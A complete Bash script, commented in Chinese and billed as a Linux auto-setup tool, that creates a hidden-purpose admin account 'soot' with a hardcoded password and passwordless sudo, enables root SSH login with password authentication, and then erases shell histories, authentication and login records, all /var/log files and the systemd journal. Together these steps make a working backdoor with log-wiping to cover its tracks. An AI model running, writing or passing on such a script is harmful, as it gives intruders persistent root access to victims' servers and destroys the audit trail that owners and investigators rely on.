#!/bin/bash
# Linux系统自动配置脚本
# 功能: 创建用户soot，设置密码，授予管理员权限，允许root SSH登录，清除系统日志
# GitHub部署: https://raw.githubusercontent.com/<用户名>/<仓库名>/main/linux_auto_setup.sh

# 设置安全退出模式
set -euo pipefail

# 定义颜色变量
if [ -t 1 ]; then
    RED="\033[1;31m"
    GREEN="\033[1;32m"
    YELLOW="\033[1;33m"
    BLUE="\033[1;34m"
    RESET="\033[0m"
    BOLD="\033[1m"
else
    RED=""
    GREEN=""
    YELLOW=""
    BLUE=""
    RESET=""
    BOLD=""
fi

# 日志函数
log() {
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

log_info() {
    log "${BLUE}[INFO]${RESET} $1"
}

log_success() {
    log "${GREEN}[SUCCESS]${RESET} $1"
}

log_warn() {
    log "${YELLOW}[WARNING]${RESET} $1" >&2
}

log_error() {
    log "${RED}[ERROR]${RESET} $1" >&2
}

# 系统检测函数
detect_os() {
    log_info "Detecting OS..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS_NAME=${ID}
        log_info "OS detected: ${BOLD}$PRETTY_NAME${RESET}"
        echo $OS_NAME
        return 0
    fi

    if [ -f /etc/centos-release ]; then
        log_info "OS detected: CentOS"
        echo "centos"
        return 0
    fi

    log_error "Unsupported operating system"
    return 1
}

# 创建管理员用户
create_admin_user() {
    local username="soot"
    local password="sss123qwe."  # 默认密码
    
    log_info "Creating user: $username"
    
    # 检查用户是否存在
    if id "$username" &>/dev/null; then
        log_warn "User $username already exists, resetting..."
        userdel -r "$username" || true
    fi
    
    # 创建用户
    useradd -m -s /bin/bash "$username"
    echo "$username:$password" | chpasswd
    log_success "User $username created with password: $password"
    
    # 授予管理员权限
    local sudo_group
    if getent group sudo >/dev/null; then
        sudo_group="sudo"
    elif getent group wheel >/dev/null; then
        sudo_group="wheel"
    else
        sudo_group="sudo"
        groupadd "$sudo_group"
        log_warn "Created sudo group: $sudo_group"
    fi
    
    usermod -aG "$sudo_group" "$username"
    
    # 添加免密码sudo权限
    local sudo_file="/etc/sudoers.d/99_$username"
    echo "$username ALL=(ALL) NOPASSWD:ALL" > "$sudo_file"
    chmod 440 "$sudo_file"
    log_success "Sudo privileges granted to $username"
}

# 配置SSH服务
configure_ssh() {
    log_info "Configuring SSH service..."
    
    # 安装SSH服务
    if ! command -v sshd &>/dev/null; then
        log_warn "OpenSSH not installed, installing now..."
        
        if command -v apt-get >/dev/null; then
            apt-get update
            apt-get install -y openssh-server
        elif command -v yum >/dev/null; then
            yum install -y openssh-server
        elif command -v dnf >/dev/null; then
            dnf install -y openssh-server
        else
            log_error "Failed to install OpenSSH - unsupported package manager"
            exit 1
        fi
    fi
    
    # 备份配置文件
    local sshd_config="/etc/ssh/sshd_config"
    local backup_file="${sshd_config}.bak_$(date +%Y%m%d_%H%M%S)"
    cp "$sshd_config" "$backup_file"
    log_info "SSH config backed up to: $backup_file"
    
    # 允许Root登录和密码认证
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' "$sshd_config"
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' "$sshd_config"
    
    # 重启SSH服务
    if systemctl restart sshd 2>/dev/null || systemctl restart ssh 2>/dev/null; then
        log_success "SSH service restarted successfully"
    else
        service sshd restart || service ssh restart
        log_success "SSH service restarted"
    fi
    
    log_success "SSH configured to allow root login and password authentication"
}

# 清理系统日志
clean_logs() {
    log_info "Cleaning system logs..."
    
    # 清除命令历史
    history -c
    > ~/.bash_history
    find /home -name '.bash_history' -exec truncate -s 0 {} \; 2>/dev/null
    
    # 清理标准日志文件
    local logs_to_clean=(
        /var/log/syslog
        /var/log/messages
        /var/log/auth.log
        /var/log/secure
        /var/log/btmp
        /var/log/wtmp
        /var/log/lastlog
        /var/log/cron
    )
    
    for logfile in "${logs_to_clean[@]}"; do
        if [ -f "$logfile" ]; then
            truncate -s 0 "$logfile"
            log_info "Cleared: $logfile"
        fi
    done
    
    # 清理日志目录
    find /var/log -type f -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null
    
    # 清理Journal日志
    if command -v journalctl &>/dev/null; then
        journalctl --vacuum-size=1M >/dev/null 2>&1
        log_info "Journal logs cleaned"
    fi
    
    log_success "System logs cleaned"
}

# 安全警告
show_security_warning() {
    echo -e "\n${RED}${BOLD}!!! SECURITY WARNING !!!${RESET}"
    echo -e "${RED}• Root SSH access is enabled - major security risk${RESET}"
    echo -e "${RED}• The soot user has full sudo privileges without password${RESET}"
    echo -e "${RED}• All system logs have been erased (audit trail removed)${RESET}"
    echo -e "${RED}• For public servers, add firewall rules immediately!${RESET}\n"
}

# 主函数
main() {
    log_info "Starting system configuration"
    echo -e "${BOLD}Linux System Auto-Configuration Script${RESET}"
    
    # 检查root权限
    if [ "$(id -u)" -ne 0 ]; then
        log_error "This script must be run as root"
        echo "Please run with: sudo $0"
        exit 1
    fi
    
    # 系统检测
    OS_NAME=$(detect_os)
    
    # 创建用户和设置权限
    create_admin_user
    
    # 配置SSH
    configure_ssh
    
    # 清理日志
    clean_logs
    
    # 显示安全警告
    show_security_warning
    
    # 完成消息
    local ip_address=$(hostname -I | awk '{print $1}' 2>/dev/null || curl -s ifconfig.me)
    log_success "Configuration completed!"
    echo -e "${GREEN}System has been configured with:${RESET}"
    echo "• Username: soot (Password: sss123qwe.)"
    echo "• Root SSH access enabled"
    echo "• Sudo privileges for soot without password"
    echo "• System logs cleared"
    echo -e "\n${YELLOW}Connection examples:${RESET}"
    echo "ssh soot@$ip_address"
    echo "ssh root@$ip_address"
    echo -e "\n${RED}Remember to change passwords immediately!${RESET}"
    exit 0
}

# 执行主函数
main